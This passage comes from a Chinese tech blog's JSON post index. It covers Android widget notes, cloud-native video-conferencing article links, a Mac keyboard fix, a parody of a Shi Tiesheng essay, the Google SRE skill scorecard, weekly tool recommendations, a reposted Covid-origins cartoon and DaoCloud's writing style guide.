IMPORTANCE_LOW：开启通知，不会弹出，没有提示音，状态栏显示\n- IMPORTANCE_DEFAULT：开启通知，不会弹出，有提示音，状态栏显示\n- IMPORTANCE_HIGH：开启通知，会弹出，有提示音，状态栏显示\n\n常用属性\n- .setContentTitle() 标题\n- .setContentText()  内容\n- .setSmallIcon()    小图片 使用 alpha 图层\n- .setLargeIcon()    大图片 Bitmap\n- .setColor()        小图标颜色 Color.parseColor(\"#ff0000\")\n- .setContentIntent() 跳转意图 PendingIntent\n- .setAutoCancel()    自动清除通知\n- .setWhen()         通知创建时间\n\n\n## Toolbar\n\n常用属性\n- id\n- layout_width\n- layout_height=\"?attr/actionBarSize\"\n- title\n- titleMarginStart\n- titleTextColor\n- subtitle\n- subtitleTextColor\n- background\n- logo\n- navigationIcon\n- layout_height=\"wrap_content\"\n- android:layout_gravity=\"center\"\n\n## AlertDialog\n\n常用属性\n- .setIcon()\n- .setTitle()\n- .setMessage()\n- .setView()     自定义布局\n- .setPositiveButton()\n- .setNegativeButton()\n- .setNeutralButton()\n\n## PopUpWindow\n\n- contentView\n- width\n- height\n- focusable\n- showAsDropDown\n- dismiss\n- touchable\n- outsideTouchable\n\n\n```java\n    View popupView = getLayoutInflater().inflate(R.layout.popup_view, null);\n    PopupWindow popupWindow = new PopupWindow(popupView, ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT, true);\n    popupWindow.showAsDropDown(view);\n```\n","categories":["Android"],"tags":["Android","控件","Widget","TextView","Button","EditText","ImageView","ProgressBar","Notification","Toolbar","AlertDialog","PopUpWindow"]},{"title":"看看大厂是如何用云原生解决千万视频会议难题的","url":"/2021/07/cloud-native-for-videoconferencing/","content":"\n## 腾讯：揭秘日活千万腾讯会议全量云原生化上TKE技术实践\n\n文章链接：https://juejin.cn/post/6844904192830603272\n\n本文总结了腾讯会议在TKE容器化部署时用到的平台相关特性，包括业务镜像自动分批灰度发布、ConfigMap分批灰度发布、Pod内A/B容器ms级切换发布、多集群发布管理、基于DynamicQuota的产品配额管理、探测节点和集群稳定性问题以提升自愈能力等。\n\n## 华为：远程办公利器华为云WeLink，如何练就硬核抗压能力？\n\n文章链接：https://zhuanlan.zhihu.com/p/106388133\n\n业务快速增长带来的挑战聚焦在海量请求的冲击，从消息到语音模块、视频会议系统，华为云WeLink核心业务采用全容器化架构，结合华为云容器引擎单集群百万容器的超大规模支撑，可以迅速在新扩容的云服务器上启动业务，每秒最快可新增1000业务实例，大大降低了业务高峰时段的断线率、故障率和请求等待时长。更能通过瑶光的二次调度进行热点消除，保障计算资源压力的平均分布，助力业务平稳运行。\n\n<!-- more -->\n\n## 字节：字节跳动容器化场景下的性能优化实践\n\n文章链接：https://www.infoq.cn/article/mu-1bFHNmrdd0kybgPXx\n\n字节跳动资源调度团队负责私有云平台 TCE 的底层 Kubernetes 集群的开发和维护工作。TCE 托管了头条、抖音、字节国际化业务等内部上万个在线微服务。随着这些业务的快速发展，集群规模不断扩大，机器负载越来越高，运维难度和成本问题越发显著。原生 Kubernetes 作为控制面系统，并不能很好地解决这些问题。为了提升系统可见性，我们基于 eBPF 实现了系统监控，使内核能更好地理解微服务，极大地提升了问题诊断效率。为提升资源利用率，我们通过动态超售，实现了业务实例的高密度部署，并通过优化 Kubernetes 资源模型，有效保证了延时敏感服务的 QoS。\n\n## 微软：Advancing Microsoft Teams on Azure—operating at pandemic scale\n\n文章链接：https://azure.microsoft.com/en-us/blog/advancing-microsoft-teams-on-azure-operating-at-pandemic-scale/\n\n\n## Zoom：Zoom deploys its core videoconferencing service on Oracle Cloud\n\n文章链接：https://www.zdnet.com/article/zoom-deploys-its-core-videoconferencing-service-on-oracle-cloud/\n\n\n## 声网：企业云原生创新与实践\n\n视频链接：https://yunqi.aliyun.com/2020/session88?liveId=44191\n","categories":["云原生"],"tags":["云原生"]},{"title":"mac 键盘延迟突然增高","url":"/2021/10/mac-keyboard/","content":"\n\n在系统菜单栏或者控制中心找到你的蓝牙图标。下图中最左边就是蓝牙，最右边是控制中心。点击控制中心，就能显示蓝牙。\n\n按下 shift+option 的同时，点击蓝牙。会出现几个隐藏选项。选择“恢复连接苹果设备的出厂设置”。 \n\n![蓝牙设置](https://up-img.yonghong.tech/pic/2021/11/18-20-50-%E6%88%AA%E5%B1%8F2021-09-27%20%E4%B8%8B%E5%8D%889.51.05-HaJhAi.png)\n\n<!-- more -->\n\n再连接你的Keyboard。就好了。","categories":["macOS"],"tags":["macOS"]},{"title":"被字节裁员后，我的脾气变得暴怒无常","url":"/2021/11/a-story/","content":"\n脉脉上一个刚编故事，记录下来。\n\n---\n\n被字节裁员后，我的脾气变得暴怒无常。望着楼下去上班的人群，我会突然把面前的镜子砸碎；听着字节回购期权的消息，我会猛地把手边的东西摔向四周的墙壁。\n\n这时候她就悄悄地躲出去，在我看不见的地方偷偷地听着我的动静。\n\n<!-- more -->\n\n当一切恢复沉寂，她又悄悄地进来，眼边红红的，看着我。\n\n“听说知春路的花儿都开了，我陪你去走走吧。”\n\n“不，我不去！”我狠命地捶打着空空的胸口，喊着，“没有工牌我活着有什么劲！”\n\n她扑过来抓住我的手，忍住哭声说：“咱俩在一块儿，好好儿活，好好儿活……”\n\n可我却一直都不知道，她已经连续加班半个月了。\n\n那天我又独自坐在屋里，她进来了。\n\n“知春路的花开了，我陪你去看看吧。”\n\n她憔悴的脸上现出央求般的神色。\n\n“什么时候？”\n\n“这个周末?”她说。我的回答让她喜出望外。\n\n我说\"那好，就周末。\"\n\n然而却没有等到周末。\n\n救护车开到园区的时候，她已经停止呼吸，电脑上还在跑着脚本。\n\n第二年，我考上老家省会的公务员，准备离开这个城市了。离开之前，我一个人走在知春路。\n\n人生最美好的几年，是在这里度过的。在这里有过兴奋和疲惫，有过得意和失落。\n\n我站定脚步，看着周围带着工牌快步走过的人们，觉得自己像是激流里的顽石一样。而这激流太猛烈，仿佛自己这块顽石也在被推着往前走。\n\n回过神来的我只觉得一片目眩，感觉自己的前半生是一场不真实的梦境。\n\n此时她的声音在我耳边响起，\"咱俩在一块儿，好好活儿，好好活儿。。。\"，我已是泪流满面。\n\n---\n\n其实这个的原文来自史铁生《秋天的怀念》。\n\n　　双腿瘫痪后，我的脾气变得暴怒无常。望着望着天上北归的雁阵，我会突然把面前的玻璃砸碎；听着听着李谷一甜美的歌声，我会猛地把手边的东西摔向四周的墙壁。\n\n　　这时，母亲就会悄悄地躲出去，在我看不见的地方偷偷地听着我的动静。当一切恢复沉寂，她又悄悄地进来，眼边红红的，看着我。\"听说北海的花儿都开了，我推着你去走走。\n\n　　她总是这么说。母亲喜欢花，可自从我的腿瘫痪以后，她侍弄的那些花都死了。\"不，我不去！\"我狠命地捶打这两条可恨的腿，喊着，\"我可活什么劲儿！\"\n\n　　母亲扑过来抓住我的手，忍住哭声说：\"咱娘儿俩在一块儿，好好儿活，好好儿活……\"\n\n　　可我却一直都不知道，她的病已经到了那步田地。后来妹妹告诉我，她常常肝疼得整宿整宿翻来覆去地睡不了觉。\n\n　　那天我又独自坐在屋里，看着窗外的树叶\"唰唰啦啦\"地飘落。\n\n　　母亲进来了，挡在窗前：\n\n　　\"北海的菊花开了，我推着你去看看吧。\"她憔悴的脸上现出央求般的神色。\n\n　　\"什么时候？\"\n\n　　\"你要是愿意，就明天？\"\n\n　　我的回答已经让她喜出望外了。\"好吧，就明天。\"\n\n　　她高兴得一会坐下，一会站起：\"那就赶紧准备准备。\"\n\n　　\"哎呀，烦不烦？几步路，有什么好准备的！\"\n\n　　她也笑了，坐在我身边，絮絮叨叨地说着：\"看完菊花，咱们就去'仿膳'，你小时候最爱吃那儿的豌豆黄儿。还记得那回我带你去北海吗？你偏说那杨树花是毛毛虫，跑着，一脚踩扁一个……\"\n\n　　她忽然不说了。对于\"跑\"和\"踩\"一类的字眼，她比我还敏感。她又悄悄地出去了。她出去了，就再也没回来。\n\n　　邻居们把她抬上车时，她还在大口大口地吐着鲜血。我没想到她已经病成那样。看着三轮车远去，也绝没有想到那竟是永远的诀别。\n\n　　邻居的小伙子背着我去看她的时候，她正艰难地呼吸着，像她那一生艰难的生活。别人告诉我，她昏迷前的最后一句话是：\n\n　　\"我那个有病的儿子和我那个还未成年的女儿……\n\n　　又是秋天，妹妹推着我去北海看了菊花。黄色的花淡雅，白色的花高洁，紫红色的花热烈而深沉，泼泼洒洒，秋风中正开得烂漫。我懂得母亲没有说完的话。妹妹也懂。我俩在一块儿，要好好儿活……","categories":["故事"],"tags":["史铁生"]},{"title":"Google 评分卡","url":"/2021/11/google-skill-level/","content":"\nGoogle评分卡的来自Google的SRE。为了保证稳定可靠的服务，Google组建了一支专业的团队来负责运行后端服务，参与的工程师有一个共同的名字：Site Reliability Engineer。\n\n对此，资深Google SRE Chris Jones等人联合撰写了《Google SRE: How Google runs production systems》，首次向外界解密了谷歌的生产环境，中文名字叫《SRE：Google运维解密》。\n\n正是在该书中提到了上面所说的“Google评分卡”。下面来看看这11个等级到底是如何划分的：\n\n<!-- more -->\n\n## 评分卡\n\n0：you are unfamiliar with the subject area.\n\n0：不熟悉的领域。也就是说对相关的领域几乎一无所知。\n\n1：you can read/understand the most fundamental aspects of the subject area.\n\n1：可以读懂或理解相关领域的大多数基础知识。\n\n2：ability to implement small changes,understand basic principles and able to figure out additional details with minimal help.\n\n2：能够实现一些小的改动，理解基本原理，能够在简单的帮助下找出更多的细节。\n\n3：basic proficiency in a subject area without relying on help.\n\n3：基本精通相关技术领域，完全不需要别人的帮助。\n\n4：you are comfortable with the subject area and all routine work on it.\n\n4：对相关技术领域非常熟悉和舒适，可以应对和完成所有的日常工作。\n\nFor software areas - ability to develop medium programs using all basic language features w/o book, awareness of more esoteric features (with book).\n\n对于软件领域，有能力开发中等规模的程序，能够熟练和掌握并使用所有的语言特性，而不需要翻书，并且能够找到所有的冷知识。\n\nFor systems areas - understanding of many fundamentals of networking and systems administration, ability to run a small network of systems including recovery, debugging and nontrivial troubleshooting that relies on the knowledge of internals.\n\n对于系统领域，了解很多网络和系统管理的基础知识，能够运行一个小型的系统网络，包括恢复、调试和依赖于内部知识的重要故障排除。\n\n5：an even lower degree of reliance on reference materials. Deeper skills in a field or specific technology in the subject area.\n\n5：对参考资料的依赖程度更低。在某一领域或某一特定技术领域有较深的技能。\n\n6：ability to develop large programs and systems from scratch. Understanding of low level details and internals. Ability to design/deploy most large, distributed systems from scratch.\n\n6：能够从零开发大型程序和系统。掌握底层细节和内在原理。能够设计和部署大多数大型分布式系统。\n\n7：you understand and make use of most lesser known language features, technologies, and associated internals. Ability to automate significant amounts of systems administration.\n\n7：理解并利用高级语言特性、技术和相关的内在原理，可以从根本上实现大量系统管理和运维工作的自动化。\n\n8：deep understanding of corner cases, esoteric features, protocols and systems including “theory of operation”. Demonstrated ability to design, deploy and own very critical or large infrastructure, build accompanying automation.\n\n8：对于一些边角和晦涩的技术、协议和系统工作原理有深入的理解和经验。能够设计、部署并负责非常关键、规模很大的基础设施，并能够构建相应的自动化设施。\n\n9：could have written the book about the subject area but didn’t; works with standards committees on defining new standards and methodologies.\n\n9：能够在该技术领域出一本经典的书。并和标准委员会的人一起制定相关的技术标准和方法。\n\n10：wrote the book on the subject area (there actually has to be a book). Recognized industry expert in the field, might have invented it.\n\n10：在该领域写过一本书，被业内尊为专家，并是该技术的发明人。\n\n## 评分领域\n\n- TCP/IP Networking（网络相关）\n- Unix/Linux internals（linux内核）\n- Unix/Linux Systems administration（linux系统运维）\n- Algorithms and Data Structures（算法和数据结构）\n- C\n- C++\n- Python\n- Java\n- Perl\n- Go\n- Shell Scripting （脚本）\n- SQL and/or Database Admin（sql和数据库管理）\n- People Management（人事管理）\n- Project Management（项目管理）","categories":["技能"],"tags":["Google"]},{"title":"每周推荐-2020-05-17","url":"/recommend/2020/001/","content":"\n## 雨景 - 一个能看雨又能听歌的视听网站\n链接：[Rainyscope: web-based weather simulator. 雨景：一个能看雨又能听歌的视听网站](http://rainyscope.com/)\n\n![Rainyscope: web-based weather simulator. 雨景：一个能看雨又能听歌的视听网站](https://up-img.yonghong.tech/pic/2020/05/截屏2020-05-12%20下午3.47.58.png)\n\n<!--more-->\n\n## 语雀 - 专业的云端知识库\n\n链接：[https://www.yuque.com/yuque/](https://www.yuque.com/yuque/)\n\n「语雀」是一个「专业的云端知识库」，孵化自 蚂蚁金服 ，是 体验科技 理念下的一款创新产品，已是 10 万阿里员工进行文档编写、知识沉淀的标配。\n\n语雀诞生伊始，只是希望能给工程师提供一个好用的工具用来写技术文档，达成「用 Markdown 写文档」这个小目标。但在产品研发的过程中，我们发现其实身边的每个人、每个团队、每个组织都有很多知识，但一直以来缺少一个好用的工具让这些知识不只是留在每个人的大脑或电脑里，还可以被记录、分享和交流。\n所以，带着这颗初心，我们觉得语雀不应止步于服务工程师，应该致力于为每个想表达所思所想的人提供一款顺手的工具，让知识能得以记录和传播，让人们可以在「语雀」中平等快乐地创作和交流知识，让再小的个体也可以拥有自己的知识库。\n\n- 首页\n![截屏2020-05-13下午2.40.45](https://up-img.yonghong.tech/pic/2020/05/截屏2020-05-13%20下午2.40.45.png)\n\n- 缘起\n![截屏2020-05-13下午2.41.56](https://up-img.yonghong.tech/pic/2020/05/截屏2020-05-13%20下午2.41.56.png)\n\n- 安全\n![截屏2020-05-13下午2.43.57](https://up-img.yonghong.tech/pic/2020/05/截屏2020-05-13%20下午2.43.57.png)\n\n\n## NTFS Tool - 为苹果电脑提供NTFS读写支持的一款免费软件\n\nNTFS Tool 是一款纯净版的NTFS 工具，支持NTFS磁盘读写、挂载，推出、管理等功能。它的界面简洁易用，希望这款工具能够为你的工作和生活带来便利👻。\n\n[GitHub仓库](https://github.com/ntfstool/ntfstool)\n\n[官网](https://ntfstool.com/)\n\n🖥 应用界面\n\n![16-15-08-5DsEwl-7uvUIY](https://up-img.yonghong.tech/pic/2020/05/16-15-08-5DsEwl-7uvUIY.jpg)\n\n![16-15-08-rjDHpQ-qQuWHF](https://up-img.yonghong.tech/pic/2020/05/16-15-08-rjDHpQ-qQuWHF.jpg)","categories":["推荐"],"tags":["recommend","每周推荐","雨景","Rainyscope","语雀","NTFS Tool","NTFS"]},{"title":"每周推荐-2020-05-24","url":"/recommend/2020/002/","content":"\n## DeepL 翻译器 - 一个将机器学习应用到翻译领域的翻译器\n\n链接：[https://www.deepl.com/translator](https://www.deepl.com/translator)\n\n科技巨头谷歌（Google）、微软（Microsoft）和脸书（Facebook）都将机器学习应用到翻译领域，但一家名为DeepL的小公司却超越了他们，并且提高了该领域的标准。\n其翻译速度可与规模庞大的竞争者相媲美，但比我们使用过的任何一个翻译工具都要准确和细致。\n\n![23-15-18-r8eIfb-ukuFW5](https://up-img.yonghong.tech/pic/2020/05/23-15-18-r8eIfb-ukuFW5.png)\n\n<!--more-->\n\n## Product Hunt - 一个供用户分享和发现产品的网站\n\n链接：[https://www.producthunt.com/](https://www.producthunt.com/)\n\nProduct Hunt 是一个供用户分享和发现产品的网站。网站于2013年由瑞安·胡佛（Ryan Hoover）创立，之后加入了 Y Combinator。用户可以以每天线性格式发送不同产品帖子到该网站上，网站亦有类似 Hacker News 或 Reddit 的留言系统。在一天中获取最高票的产品在当天的列表中排序最高。\n\n产品分成三个种类：科技（网络应用程序、移动应用程序、硬件产品等）、游戏（电脑、网上、流动）和书籍。截至2014年7月所有用户都可发送产品，只需提供产品名称、网址和宣传标语。但是，只有一群被其他可留言用户选择的用户可在产品帖子上留言。\n\n![23-15-15-kaf5Io-mfCUm7](https://up-img.yonghong.tech/pic/2020/05/23-15-15-kaf5Io-mfCUm7.png)\n\n## iFixit - 免费修理手册\n\n链接：[https://zh.ifixit.com/](https://zh.ifixit.com/)\n\niFixit 是一个以维修为主题的全球性互助社区。从一个一个的设备开始，让我们来一步一个脚印一点一点的修复这个世界。你可以在问题解答论坛和专家一起互动——还可以创建并与全世界分享由你编篡的维修手册。你可以在这里买到所有关于你的 DIY 维修计划的配件及工具，帮助修复好你的苹果或安卓设备。\n\n![18-13-27-截屏2020-05-18下午1.23.54-E1YoEQ](https://up-img.yonghong.tech/pic/2020/05/18-13-27-截屏2020-05-18%20下午1.23.54-E1YoEQ.png)\n\n![18-13-30-截屏2020-05-18下午1.23.44-WbW8V2](https://up-img.yonghong.tech/pic/2020/05/18-13-30-截屏2020-05-18%20下午1.23.44-WbW8V2.png)\n","categories":["推荐"],"tags":["recommend","weekly","DeepL","iFixit"]},{"title":"每周推荐-2020-05-31","url":"/recommend/2020/003/","content":"\n## 艾特网 - 程序员导航站、程序员之家\n\n地址：[https://iiter.cn/](https://iiter.cn/)\n\n![30-16-14-截屏2020-05-30下午4.11.13-fHudzv](https://up-img.yonghong.tech/pic/2020/05/30-16-14-截屏2020-05-30%20下午4.11.13-fHudzv.png)\n\n<!--more-->\n\n## 电子书网站\n\n- [Aibooks爱书屋 https://www.aibooks.cc/](https://www.aibooks.cc/)\n  - 永久免费优质免费电子图书籍资源,电子杂志下载\n- [书伴 – 为静心阅读而生 https://bookfere.com/](https://bookfere.com/)\n  - 书伴（bookfere.com），创建的目的是帮助您更便捷、深入地使用手中的Kindle阅读器，让读书成为生命的一部分，让灵魂永远行走在路上。\n- [胖虎书屋 - 一个更丰富开放的分享站，分享每一寸阳光 http://panghubook.cn/](http://panghubook.cn/)\n  -  胖虎书屋是一个优质的资源分享社区，在这里，你可以随意地分享，一本书、一个故事、一寸阳光…… 我们相信，每个人都是生活中的艺术家，爱分享的你有着无穷的魅力。\n- [在线电子书转换, 免费电子书转换器 http://cn.epubee.com/](http://cn.epubee.com/)\n  - 小蜜蜂在线电子书转换器, 转换电子书，支持绝多数格式如mobi, azw, txt, epub, pdf, azw3, htmlz等等，在线转换，质量高，速度快，生成的电子书能在各种设备上阅读!","categories":["推荐"],"tags":["recommend","weekly"]},{"title":"每周推荐-2020-06-07","url":"/recommend/2020/004/","content":"\n## manojVivek/responsively-app\n\n一个专门为加快响应式开发而修改的浏览器。\n\n直达链接：[https://github.com/manojVivek/responsively-app](https://github.com/manojVivek/responsively-app)\n\n![07-10-39-responsively-app-4zBAii](https://up-img.yonghong.tech/pic/2020/06/07-10-39-responsively-app-4zBAii.gif)\n\n<!--more-->\n\n## CODELF - 变量命名神器\n\n可帮助开发人员解决命名问题的搜索工具。\n\n直达链接：[https://github.com/unbug/codelf](https://github.com/unbug/codelf)\n\n![07-11-08-E7FxsB-0D4NnK](https://up-img.yonghong.tech/pic/2020/06/07-11-08-E7FxsB-0D4NnK.jpg)\n\n## carbon - 生成分享代码图片的工具\n\n直达链接：[https://carbon.now.sh/](https://carbon.now.sh/)\n\n![07-11-25-截屏2020-06-07上午11.25.21-bASG93](https://up-img.yonghong.tech/pic/2020/06/07-11-25-截屏2020-06-07%20上午11.25.21-bASG93.png)\n\n## TableConvert - 将表格转换成各种语言\n\n直达链接：[https://tableconvert.com/](https://tableconvert.com/)\n\n![07-11-27-截屏2020-06-07上午11.26.35-i3Frty](https://up-img.yonghong.tech/pic/2020/06/07-11-27-截屏2020-06-07%20上午11.26.35-i3Frty.png)","categories":["推荐"],"tags":["recommend","weekly"]},{"title":"每周推荐-2020-09-06","url":"/recommend/2020/005/","content":"\n## 微信公众号\n\n### 21世纪经济报道\n\n- [马云谈教育：很多家庭都有一个焦虑的妈妈和暴躁的爸爸，培养孩子是投资不可能一夜涨停](https://mp.weixin.qq.com/s/P7o8Xes0fDc5g6StS0lfCQ)\n> “一般开学第一课给孩子上，我认为我们应该给家长上。因为在中国，孩子18岁之前，决定孩子命运、决定孩子学习的是家长。”8月30日，马云在云谷学校分享了他对教育的一些思考。\n\n### 人物\n\n- [周奇墨：温水煮青蛙](https://mp.weixin.qq.com/s/pzYeTIpnzFfOHyR8OWk6Vg)\n> 有评论说你这种温吞吞的表演注定火不了。这个评价出现的第一天起，我就接受它，我觉得这是我的风格，温吞吞，我反而有的时候会为它感到有一点骄傲吧，这种表演也能听进去，那也挺好的。\n\n- [直播江湖里的高手过招](https://mp.weixin.qq.com/s/w2jfrwmfQNNjvQanspXCaw)\n> 4年前，当淘宝首创电商直播时，所有人也不曾想到这将成为一个风口行业。当时间来到2020时，更没有人想到直播电商仅仅只用了8个月时间，就实现了爆炸式增长，甚至成为行业趋势，成为了未来。\n> \n> 这世上没有一样东西我想占有。\n> 我知道没有一个人值得我羡慕。\n> 任何我曾遭受的不幸，我都已忘记。\n> 想到故我今我同为一人并不使我难为情。\n> 在我身上没有痛苦。\n> 直起腰来，我望见蓝色的大海和帆影。\n\n<!--more-->\n\n### 深响\n\n- [二线网约车集体反攻滴滴：蚂蚁真的能啃噬大象吗？](https://mp.weixin.qq.com/s/twxz6ETMGYiv57Cy-laVew)\n> 聚合流量平台和传统车企是搅动网约车市场、为滴滴带来竞争压力的主要力量。对于二线网约车品牌们而言，更底层的驱动力源于市场竞争逻辑的变化。滴滴的起落已经展示出，要做好网约车生意，最终还是要回归到服务、商业本质上来。\n\n### 腾讯财经\n\n### 棱镜\n\n\n### 资本侦探\n\n- [拨开中概股二次上市迷雾：B站拼多多年内都不能回家](https://mp.weixin.qq.com/s/ZTYu1-c4GxOGWvrr5GgMbg)\n\n### 设计\n\n#### 小米设计\n\n- [小米10周年至尊纪念版的设计物语](https://mp.weixin.qq.com/s/LZq6I4xE67lvpWrEQQTxwQ)\n\n#### 庞门正道\n\n- [死了都可爱了！！](https://mp.weixin.qq.com/s/YPtkCSp6db_pU-3npDD3dg)\n\n#### 字节范儿\n\n- [字节跳动logo还能变成这样？！](https://mp.weixin.qq.com/s/S3neRBsr1Iv5zR1NCxKYyQ)\n\n#### 普象工业设计小站\n\n- [她画的表，比有些真表还贵！](https://mp.weixin.qq.com/s/QD6aEyjTCGwYZCc6Sh5DYA)\n\n#### 其他\n\n- 【无人机】[F1到F22战斗机全集！](https://mp.weixin.qq.com/s/jRPZJOmh_oEZaYNf_4NJlQ)\n- 【咪咕阅读】[企鹅这些年骗得我们好苦！它们根本不是什么好鹅！](https://mp.weixin.qq.com/s/bJji7leXXPgsLicucDCI6g)\n- 【央视新闻】[“蓬佩奥先生，好好照照镜子”](https://mp.weixin.qq.com/s/YIkTrPmbAh4otD_hDnJQBg)\n\n\n### 公开课/演讲/会议\n\n- [聚焦高可用架构，腾讯&贝壳十余位专家级讲师成团来袭！](https://mp.weixin.qq.com/s/GCQA-23JApy5BSu7zCi5YQ)","categories":["推荐"],"tags":["recommend","weekly"]},{"title":"Covid-19: Where am I from? ","url":"/repost/2020/covid-19-where-am-i-from/","content":"\n## Covid-19: Where am I from? \n\n开篇，代表“新冠病毒”的紫色小人，略显落寞地站在微观世界之中，发出质问：我究竟来自何方？\n\n“医护人员”、“世卫组织”（WHO）和拿着医学刊物《柳叶刀》（The Lancet）的三个小人正绞尽脑汁、七嘴八舌地探讨着：病毒或许来自蝙蝠，也可能来自实验室，但目前尚无定论。\n\n就在众人讨论之际，穿着星条旗背心，发型神似特朗普的小人又出来了。这次他没有像上集漫画一样，袖手旁观，说风凉话，而是迅速向前，推开一众科学家和专业人士，嘴里喊着：“我知道！（I Know）”\n\n他的脸变得与美国总统特朗普相似，不断叨叨着：“中国、中国、中国、中国、中国......”\n\n此时，“世卫组织”，“医护人员”以及“柳叶刀”头上，再度像上次一样，充满了问号。一直以背影示人的“新冠病毒”，此时也回过了头，再度露出了谜一般的笑容，还说道：“对不起，啥？（Excuse me）”\n\n| 1 | 2 |\n| ![20-22-28-EYYmw7sUYAAd1-6-684bPz](https://up-img.yonghong.tech/pic/2020/05/20-22-28-EYYmw7sUYAAd1-6-684bPz.jpeg) | ![20-22-29-EYYmxvQU0AMNxmy-3P03dX](https://up-img.yonghong.tech/pic/2020/05/20-22-29-EYYmxvQU0AMNxmy-3P03dX.jpeg) |\n\n## 不干正事\n\n一位神似美国国务卿蓬佩奥的角色，向一名黑发医护工作者喷洒墨汁。此时，医护人员正用针筒抗击“新冠病毒”，而后者正用弹弓攻击坐在轮椅上，无助地喊着“救命”的老人......\n\n![20-22-30-EYY86OeUwAUqhbk-0682kG](https://up-img.yonghong.tech/pic/2020/05/20-22-30-EYY86OeUwAUqhbk-0682kG.jpeg)\n\n## 沉迷\n\n代表着美国老年人群体的老人正挣扎求助，并已被“新冠病毒”打倒在地，而穿着西装的光头男子，却无暇顾及，只顾用机枪不断向外打着“责怪中国”（Blame China）的弹药。\n\n![20-22-31-EYY-Fi2UMA445vg-lGbW3j](https://up-img.yonghong.tech/pic/2020/05/20-22-31-EYY-Fi2UMA445vg-lGbW3j.jpeg)","categories":["转载"],"tags":["漫画"]},{"title":"DaoCloud 写作规范和格式规范","url":"/repost/2020/daocloud-copywriting-style-guide/","content":"\n> 本文转载自 [DaoCloud 文案风格指南](https://guide.daocloud.io/dcs/%E5%86%99%E4%BD%9C%E8%A7%84%E8%8C%83%E5%92%8C%E6%A0%BC%E5%BC%8F%E8%A7%84%E8%8C%83-9153803.html)\n\n## 公司及产品名称\n\n我们的公司及产品名称是「DaoCloud」。注意这是两个单词的合成词，所以中间沒有空格（参考：GitHub）。如作为 URL 的一部分，应该使用全小写的「daocloud」。\n\n## 文案风格\n\n1. 一定多检查，确保没有错别字。\n2. 即使是流行语中的谐音错别字也不要使用，比如「墙裂」、「童鞋」等。\n3. 我们崇尚精练的文风。请在检查中把对表达意思没有明显作用的字、词、句删除，在不影响表达效果的前提下把文案长度减到最短。\n4. 记住，如果你写了一条文案觉得非常聪明非常好笑，很可能需要停下来想一下用户是否能理解。（本条感谢 37signals 的文案建议）\n\n<!-- more -->\n\n## 中文、英文、数字混排时空格的使用\n\n1. 英文与非标点的中文之间需要有一个空格，如「使用 DaoCloud 自动构建和部署」而不是「使用DaoCloud自动构建和部署」。\n2. 数字与非标点的中文之间需要有一个空格，如「我们发布了 5 个产品」而不是「我们发布了5个产品」。 正确：「这是 1 款 Android 应用」，错误：「这是1款Android应用」。 正确：「2014 年 2 月 14 日」，错误：「2014年2月14日」。\n3. 尽可能使用中文数词，特别是当前后都是中文时。上面的例子写为「我们发布了五个产品」会更好。\n4. 除了「%」、「°C」、以及倍数单位(如 2x、3n)之外，其余数字与单位之间需要加空格。\n5. 注意特殊名词的大小写：Android、iOS、iPhone、Google、Apple，无论是否在句首都应该以同样的方式写。\n6. 在官方文案中尽量使用中文，避免中英文混合的情况。例如「App」一般应写为「应用」或「移动应用」。品牌、产品名、人名、地名等特殊名词，如果来自英文，请使用英文以避免在不同译法之间选择。\n7. 书写时括号中全为数字，则括号用半角括号且首括号前要空一格，例如「联系人 (22)」。\n\n## 标点相关\n\n1. 只有中文或中英文混排中，一律使用中文/全角标点。\n2. 中英文混排中如果出现整句英文，则在这句英文中使用英文/半角标点。\n3. 中文标点与其他字符间一律不加空格。 正确：「有：Apple、Android、诺基亚」错误：「有：Apple 、 Android 、 Nokia」\n4. 中文文案中使用中文引号「」和『』，其中「」为外层引号。Mac 上如「百度输入法」等都可以方便地输入中文引号。\n5. 省略号请使用「……」标准用法，不要使用「。。。」 ，也不要使用三个英文句点「.」。\n6. 感叹号：请勿使用「！！」。尽量避免使用「！」。请先冷静下来再坐电脑前敲键盘。\n7. 波浪号：请勿在文章内使用「`~`」，活泼地卖萌有很多其他的表达方式。\n\n## 段落\n\n1. 如果是纯文本，段落之间使用一个空行隔开。如果是 HTML 或其他富文本格式，使用额外空白作为段落间的分隔。\n2. 段落开头不要留出空白字符。\n\n## 引用来源\n\n1. 如果在正文中部分引用第三方内容，请使用恰当的引用格式并注明出处。如： One man’s constant is another man’s variable. — Alan Perlis\n2. 如果是全篇转载，请在全文开头显著位置注明作者和出处，并链接至原文，如： 本文转载自 WikiQuote\n3. 如果格式不允许超链接，请以文本方式直接给出原文链接。如果原文链接太长影响美观，可以使用短链接服务。如： 本文转载自 WikiQuote：http://bit.ly/UlHIdN\n4. 文中有使用外站图片，必须在文末标明。来源如果来自外站必须添加链接，来源如果来自外部作品则不需要。如：「本文部分图片来自 ifanr」「题图来自：《春娇与志明》截图」。\n5. 若文章为全文翻译，必须在注明作者和出处，并链接至原文。\n6. 若文章为部分编译，则需在文末注明作者和出处。如：「本文部分内容编译自 Apple」「本文部分观点来自煮机网微博」。\n\n## 细节问题\n\n1. 「你」和「您」：在不是很正式或没有明确的个体指代对象的时候请用「你」，如文档、博客、群发的邮件等；在指代特定个体时请用「您」，如活动邀请函等。\n2. 自我称呼：使用「我」，不推荐使用「小编」、「笔者」、「兼职编辑」、「兼职作者」自称。\n3. 字体和字号的一致：在富文本格式文档中，特别是 HTML 邮件中，常有人因为从不同来源复制粘贴而导致同一层次的文本字体和字号不一致。这给人不专业的感觉，请避免。\n4. App 是 application 的缩写，发音为 /ˈæp/，所以要注意不要把三个字母拆开念。App 是一个普通名词而不是多个单词的首字母缩写，所以不应该用全大写的 APP。和其他词一样，大小写规则取决于是否处于句首、标题、或特殊短语（如 App Store）中。大多数情况下应该使用中文「应用」以避免这样的问题。\n\n## 遣词造句\n\n1. 用主动语态，不要用被动语态。一般情况下，主动语态比被动语态更有力。\n2. 使用具体、明确、展示细节的词汇，能激发想象，使读者自己代入情境。「把硬币放进口袋里，他咧开嘴笑了」，远远强过「他满意地拿走了辛苦挣来的奖赏」。\n3. 减少形容词的使用，少用 「的」。\n4. 「的」「地」「得」要用对。是的，连小学都不要求了但是要用对。\n\n## 文章引言\n\n文章引言非常重要。它的作用主要是用于网站首页展示和微博分享，它是为了吸引读者阅读文章而存在，它的目的是让读者能够仅通过这一小段话，就能迅速了解到这篇文章的大致内容。因此，引言实际就是文章的「内容概要」，而非文章的开头首段。\n\n我们建议通常在写完整篇文章后，再结合内容大纲撰写引言。引言务必要讲清两个问题：\n\n1. 是什么？（例如：这是一款什么应用？这篇文章是讲的什么？）\n2. 